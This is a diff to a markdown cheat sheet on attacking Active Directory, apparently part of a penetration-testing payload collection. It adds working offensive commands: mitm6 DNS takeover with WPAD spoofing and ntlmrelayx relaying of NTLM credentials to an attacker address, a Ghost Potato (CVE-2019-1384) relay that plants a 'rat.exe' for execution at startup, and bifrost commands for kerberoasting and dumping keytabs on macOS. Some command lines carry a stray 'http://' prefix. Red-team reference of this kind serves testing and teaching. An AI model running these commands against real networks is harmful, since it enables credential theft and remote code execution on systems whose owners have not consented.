@@ -24,8 +24,10 @@
   * [Capturing and cracking NTLMv2 hashes](#capturing-and-cracking-ntlmv2-hashes)
   * [NTLMv2 hashes relaying](#ntlmv2-hashes-relaying)
     * [MS08-068 NTLM reflection](#ms08-068-ntlm-reflection)
-    * [SMB Signing Disabled](#smb-signing-disabled)
+    * [SMB Signing Disabled and IPv4](#smb-signing-disabled-and-ipv4)
+    * [SMB Signing Disabled and IPv6](#smb-signing-disabled-and-ipv6)
     * [Drop the MIC](#drop-the-mic)
+    * [Ghost Potato](#ghost-potato)
   * [SCF file attack against writeable share](#scf-file-attack-against-writeable-share)
   * [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
   * [Trust relationship between domains](#trust-relationship-between-domains)
@@ -64,6 +66,7 @@
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 
   ```bash
+  apt-get install -y libssl-dev libffi-dev python-dev build-essential
   git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
   crackmapexec smb -L
   crackmapexec smb -M name_module -o VAR=DATA
@@ -554,6 +557,12 @@ Alternatively with [Rubeus](https://github.com/GhostPack/Rubeus)
 .\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
 ```
 
+Alternatively on macOS machine you can use [bifrost](https://github.com/its-a-feature/bifrost)
+
+```powershell
+./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
+```
+
 Then crack the ticket with hashcat or john
 
 ```powershell
@@ -715,7 +724,7 @@ msf > use exploit/windows/smb/smb_relay
 msf exploit(smb_relay) > show targets
 ```
 
-#### SMB Signing Disabled 
+#### SMB Signing Disabled and IPv4
 
 If a machine has `SMB signing`:`disabled`, it is possible to use Responder with Multirelay.py script to perform an `NTLMv2 hashes relay` and get a shell access on the machine.
 
@@ -749,6 +758,23 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
     $ proxychains mssqlclient.py contoso/normaluser1@192.168.48.230 -windows-auth
     ```
 
+
+#### SMB Signing Disabled and IPv6
+
+Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.
+
+```powershell
+cme smb $hosts --gen-relay-list relay.txt
+
+# DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6
+mitm6 -i eth0 -d $domain
+
+# spoofing WPAD and relaying NTLM credentials
+http://ntlmrelayx.py -6 -wh $attacker_ip -of loot -tf relay.txt
+or 
+http://ntlmrelayx.py -6 -wh $attacker_ip -l /tmp -socks -debug
+```
+
 #### Drop the MIC
 
 > The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP
@@ -781,6 +807,18 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
     secretsdump.py -k -no-pass second-dc-server.local -just-dc
     ```
 
+#### Ghost Potato - CVE-2019-1384
+
+Prerequisites:
+* User must be a member of the local Administrators group
+* User must be a member of the Backup Operators group
+* Token must be elevated
+
+Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip
+
+```powershell
+ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
+```
 
 ### SCF file attack against writeable share
 
@@ -1107,6 +1145,12 @@ $ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
 	 Key: 6b3723410a3c54692e400a5862256e0a
 	 Time stamp: Oct 07,  2019 09:12:02
 [...]
+```
+
+On macOS you can use `bifrost`.
+
+```powershell
+./bifrost -action dump -source keytab -path test
 ```
 
 Connect to the machine using the account and the hash with CME.
